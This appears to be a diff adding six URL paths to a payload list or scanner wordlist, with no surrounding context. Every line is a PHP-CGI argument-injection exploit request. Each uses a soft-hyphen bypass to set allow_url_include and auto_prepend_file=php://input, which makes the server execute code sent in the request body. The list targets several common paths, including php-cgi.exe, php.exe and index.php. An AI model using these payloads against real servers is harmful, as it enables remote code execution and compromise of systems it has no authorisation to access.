@@ -1,0 +1,6 @@
+/cgi-bin/php-cgi.exe?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input
+/php-cgi/php-cgi.exe?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input
+/cgi-bin/php.exe?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input
+/php-cgi/php.exe?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input
+/index.php?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input
+/index.test?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input
